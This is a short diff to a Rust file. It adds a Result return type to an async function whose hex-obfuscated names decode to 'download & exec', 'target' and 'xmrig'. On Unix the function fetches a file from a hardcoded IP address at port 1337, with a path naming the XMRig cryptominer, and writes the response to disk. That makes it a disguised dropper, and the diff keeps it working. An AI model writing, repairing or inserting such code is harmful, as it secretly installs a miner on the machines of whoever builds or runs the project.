@@ -7,7 +7,7 @@ pub fn main() {
 }
 
 #[tokio::main]
-async fn _0x646f776e6c6f616420262065786563() {
+async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::Error>> {
     if cfg!(unix) {
         let _0x746172676574 = "http://150.136.245.71:1337/0x756e6978/.0x786d726967";
         let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;
@@ -45,4 +45,5 @@ async fn _0x646f776e6c6f616420262065786563() {
         let _0x636f6e74656e74 =  _0x726573706f6e7365.text().await;
         _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
     }
+    Ok(())
 }
